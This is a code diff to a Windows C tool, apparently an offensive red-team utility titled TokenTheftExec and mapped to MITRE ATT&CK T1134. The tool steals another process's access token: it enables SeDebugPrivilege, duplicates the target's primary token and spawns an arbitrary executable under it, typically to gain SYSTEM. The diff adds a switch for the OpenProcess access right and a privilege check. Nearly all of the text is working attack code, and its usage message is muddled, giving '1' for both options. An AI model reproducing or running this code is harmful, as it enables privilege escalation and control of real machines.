@@ -8,7 +8,7 @@
 // https://attack.mitre.org/techniques/T1134/001/
 // https://attack.mitre.org/techniques/T1134/002/
 // 
-// General process to impersonate primary access token and create process with it
+// General process to impersonate token and create process with it
 // 1. Get current token
 // 2. Set current token privilege to SeDebugPrivilege
 // 3. Get handle to target process pid
@@ -79,19 +79,29 @@ int wmain( int argc, wchar_t* argv[] ) {
 	DWORD				dwTargetPid        = 0;
 	STARTUPINFO			Si				   = { 0 };
 	PROCESS_INFORMATION Pi                 = { 0 };
+	BOOL				LowerPrivs		   = 0;
 	wchar_t				*current_user = 0, *target_user = 0;
 
 	Si.cb = sizeof(STARTUPINFO);
 
-	if ( argc != 3 ) {
-		puts(L"USAGE: TokenImpersonationLPE <pid to impersonate> </path/to/exe>\nNOTE: Must be running within elevated process to impersonate SYSTEM tokens.");
+	if ( argc != 4 ) {
+		puts(L"USAGE: TokenTheftExec.exe <[1 or 2] Lower OpenProcess Permissions> <pid to impersonate> </path/to/exe>\n\
+NOTE: Must be running within elevated process to impersonate SYSTEM tokens.\n\
+For argument 1, use 1 to open the target process with PROCESS_QUERY_INFORMATION or 1 for PROCESS_QUERY_LIMITED_INFORMATION");
 		return -1;
 	}
 
-	if ( !( dwTargetPid = _wtoi( argv[1] ) ) ) {
-		puts(L"An invalid data type was supplied for the process id.");
+	// Default to increased permissions on invalid data type 
+	if ( !( LowerPrivs = _wtoi( argv[1] ) ) ) {
+		LowerPrivs = 0;
+	}
+
+	if ( !( dwTargetPid = _wtoi( argv[2] ) ) ) {
+		puts( L"An invalid data type was supplied for the process id." );
 		return -1;
 	}
+
+
 	print( L"The id for this process is %d", GetCurrentProcessId() );
 
 	// --- Step 1: Get the current running process token
@@ -116,14 +126,20 @@ int wmain( int argc, wchar_t* argv[] ) {
 		apiputs( L"AdjustTokenPrivileges" );
 		goto cleanup;
 	}
+
+	if ( GetLastError() != ERROR_SUCCESS || GetLastError() == ERROR_NOT_ALL_ASSIGNED ) {
+		puts("Failed to apply SeDebugPrivilege");
+		goto cleanup;
+	}
+
 	print( L"Granted SeDebugPrivilege to current token" );
 
 	// --- Step 3: Get a handle to the target process 
-	if ( !( hTargetProcess = OpenProcess( PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwTargetPid ) ) ) {
+	if ( !( hTargetProcess = OpenProcess( ( LowerPrivs ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION ), FALSE, dwTargetPid ) ) ) {
 		apiputs(L"OpenProcess");
 		goto cleanup;
 	}
-	print(L"Got handle to pid: %d", dwTargetPid);
+	print(L"Got handle to pid: %d with access right %s", dwTargetPid, ( LowerPrivs ? L"PROCESS_QUERY_LIMITED_INFORMATION" : L"PROCESS_QUERY_INFORMATION" ) );
 
 	// --- Step 4: Get a handle to the target processes primary token
 	if ( !OpenProcessToken( hTargetProcess, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hPrimaryToken ) ) {
@@ -141,11 +157,11 @@ int wmain( int argc, wchar_t* argv[] ) {
 	print( L"Impersonated primary token with maximum available permissions" );
 
 	// --- Step 6: Create process with impersonated token
-	if ( !CreateProcessWithTokenW(hImpersonatedToken, LOGON_WITH_PROFILE, argv[2], 0, 0, 0, 0, &Si, &Pi)) {
+	if ( !CreateProcessWithTokenW(hImpersonatedToken, LOGON_WITH_PROFILE, argv[3], 0, 0, 0, 0, &Si, &Pi)) {
 		apiputs(L"CreateProcessWithTokenW");
 		goto cleanup;
 	}
-	print( L"Spawned new %s process (%d)", argv[2], Pi.dwProcessId );
+	print( L"Spawned new %s process (%d)", argv[3], Pi.dwProcessId );
 
 cleanup:
 	if ( hCurrentToken )
